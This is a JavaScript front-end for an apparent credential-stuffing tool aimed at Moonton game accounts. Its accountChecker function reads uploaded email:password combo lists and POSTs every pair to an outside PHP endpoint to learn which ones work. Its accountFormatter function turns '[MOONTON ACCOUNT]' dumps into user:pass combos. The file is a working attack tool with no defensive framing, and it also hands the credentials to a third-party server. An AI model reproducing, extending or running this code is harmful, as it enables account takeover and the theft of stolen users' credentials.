document.getElementById("accCheckerBtn").addEventListener("click", () => processFile("checker"));
document.getElementById("urlRemoverBtn").addEventListener("click", () => processFile("urlRemover"));
document.getElementById("accFormatterBtn").addEventListener("click", () => processFile("formatter"));
document.getElementById("backBtn").addEventListener("click", () => goBack());

async function processFile(type) {
  const fileInput = document.getElementById("fileInput");
  const outputContainer = document.getElementById("output");
  const outputContent = document.getElementById("outputContent");
  const backBtn = document.getElementById("backBtn");

  if (!fileInput.files.length) {
    alert("Please upload a file first!");
    return;
  }

  const file = fileInput.files[0];
  const text = await file.text();
  let results;

  if (type === "checker") {
    results = await accountChecker(text);
  } else if (type === "urlRemover") {
    results = urlRemover(text);
  } else if (type === "formatter") {
    results = accountFormatter(text);
  }

  outputContent.textContent = results.join("\n");
  outputContainer.style.display = "block";
  backBtn.style.display = "block";
}

function accountChecker(text) {
  const lines = text.split("\n").filter((line) => line.trim());
  const apiUrl = "https://www.jarelldanegods.elementfx.com/hat.php";

  return Promise.all(
    lines.map(async (line) => {
      const [email, password] = line.split(":");
      const formData = new URLSearchParams();
      formData.append("uu", email);
      formData.append("pp", password);

      try {
        const response = await fetch(apiUrl, { method: "POST", body: formData });
        const data = await response.json();
        return `${line} => ${data.status}`;
      } catch (err) {
        return `${line} => failed`;
      }
    })
  );
}

function urlRemover(text) {
  const jsonPatterns = ["http://", "https://", "www."]; // Add patterns from your JSON file
  const lines = text.split("\n").filter((line) => line.trim());
  return lines.map((line) =>
    jsonPatterns.reduce((acc, pattern) => acc.replace(new RegExp(pattern, "g"), ""), line)
  );
}

function accountFormatter(text) {
  const lines = text.split("\n").filter((line) => line.trim());
  const formatted = [];

  lines.forEach((line) => {
    if (line.startsWith("[MOONTON ACCOUNT]")) {
      if (formatted.length) formatted.push("\n");
    } else if (line.startsWith("USERNAME:")) {
      formatted.push(line.split(":")[1].trim());
    } else if (line.startsWith("PASSWORD:")) {
      formatted[formatted.length - 1] += `:${line.split(":")[1].trim()}`;
    }
  });

  return formatted;
}

function goBack() {
  document.getElementById("output").style.display = "none";
}
